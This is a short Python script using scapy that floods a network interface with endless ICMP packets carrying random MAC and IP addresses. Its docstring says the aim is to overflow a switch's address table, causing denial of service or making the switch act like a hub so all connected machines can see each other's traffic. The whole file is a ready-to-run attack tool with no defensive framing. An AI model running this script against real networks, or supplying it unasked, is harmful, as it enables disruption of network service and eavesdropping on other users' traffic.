#!/usr/bin/python

"""
By flooding the router or switch'es memory with random addresses, we can cause a buffer overflow.
This can lead from DoS (Denial of Service) to stopping the switching and behaving like a normal hub.
In hub mode, the overall higher traffic raise is not the only problem you would have, all connected
computers could see the complete traffic without additional actions.
"""

import sys
from scapy.all import *

# ICMP (Ping) Packet with random source and destinations
packet = Ether(src=RandMAC(), dst=RandMAC()) / \
            IP(src=RandIP(), dst=RandIP()) / \
            ICMP()

if len(sys.argv) < 2:
    interface = "wlp5s0"
else:
    interface = sys.argv[1]

print(f"Flooding {interface} with random packets..")
# Generate and send packets in a loop
sendp(packet, iface=interface, loop=1)

